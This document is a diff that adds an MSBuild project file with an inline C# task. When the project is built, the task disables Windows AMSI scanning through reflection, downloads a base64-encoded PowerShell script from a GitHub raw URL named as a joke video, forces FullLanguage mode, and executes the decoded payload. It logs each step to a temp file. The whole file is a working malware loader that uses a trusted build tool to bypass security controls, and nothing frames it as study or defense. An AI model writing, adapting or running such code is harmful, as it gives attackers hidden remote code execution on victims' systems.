@@ -1,0 +1,77 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="R">
+    <C />
+  </Target>
+  <UsingTask TaskName="C" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+    <ParameterGroup />
+    <Task>
+      <Reference Include="System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.Net;
+using System.Text;
+using System.IO;
+using System.Reflection;
+using System.Threading;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class C : Task, ITask {
+  static string LOG = Path.Combine(Path.GetTempPath(), "mb.log");
+  static void W(string s) { try { File.AppendAllText(LOG, s + "\n"); } catch {} }
+
+  public override bool Execute() {
+    W("start");
+    Thread t = new Thread(() => {
+      try {
+        try {
+          Type amsi = typeof(PSObject).Assembly.GetType("System.Management.Automation.AmsiUtils");
+          if (amsi != null) {
+            FieldInfo f = amsi.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
+            if (f != null) { f.SetValue(null, true); W("amsiInitFailed set to true"); }
+          }
+        } catch (Exception ea) { W("amsi-bypass-err: " + ea.Message); }
+
+        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+        WebClient wc = new WebClient();
+        wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+        string b = wc.DownloadString("https://raw.githubusercontent.com/mstrvndev/heheJoke/refs/heads/main/hahahaVideo.ps1").Trim();
+        W("downloaded len=" + b.Length);
+        string s = Encoding.UTF8.GetString(Convert.FromBase64String(b));
+        W("decoded len=" + s.Length);
+
+        InitialSessionState iss = InitialSessionState.CreateDefault();
+        iss.ApartmentState = ApartmentState.STA;
+        iss.ThreadOptions = PSThreadOptions.UseCurrentThread;
+        try { iss.LanguageMode = PSLanguageMode.FullLanguage; W("set FullLanguage"); }
+        catch (Exception e1) { W("CLM-set-fail: " + e1.Message); }
+
+        using (Runspace rs = RunspaceFactory.CreateRunspace(iss)) {
+          rs.Open();
+          W("runspace opened, lang=" + rs.SessionStateProxy.LanguageMode.ToString());
+          using (PowerShell ps = PowerShell.Create()) {
+            ps.Runspace = rs;
+            ps.AddScript(s);
+            var results = ps.Invoke();
+            W("payload invoked, results=" + results.Count);
+            if (ps.Streams.Error.Count > 0) {
+              foreach (ErrorRecord er in ps.Streams.Error) W("PS-ERR: " + er.ToString());
+            }
+          }
+          rs.Close();
+        }
+      } catch (Exception ex) { W("EX: " + ex.ToString()); }
+    });
+    t.SetApartmentState(ApartmentState.STA);
+    t.Start();
+    t.Join();
+    W("finished");
+    return true;
+  }
+}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>
